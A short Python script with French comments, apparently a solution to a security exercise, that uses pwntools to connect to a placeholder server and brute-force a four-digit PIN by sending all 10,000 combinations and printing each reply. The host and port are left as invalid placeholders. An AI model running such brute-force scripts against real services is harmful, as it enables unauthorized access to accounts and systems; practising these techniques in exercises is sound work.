#############################################################
#########IL FAUT UTILISER LINUX POUR CET EXERCICE############
#############################################################


from pwn import *
from itertools import product


io = remote('@serveur', port serveur)


number = "0123456789"
#puisque le pin est de 4 chiffres
for pin in product(number, repeat=4):
    try:
        s = ''.join(pin)
    
        io.sendline(s)
        #pour recevoire la reponse de serveur
        response = io.recvline().decode('utf-8').strip()#strip poue enlever le \n et decode pour enlever b'  

        print("le pin envoyer est ",s,"la reponse de serveur est",response)
    except:
        break

io.interactive()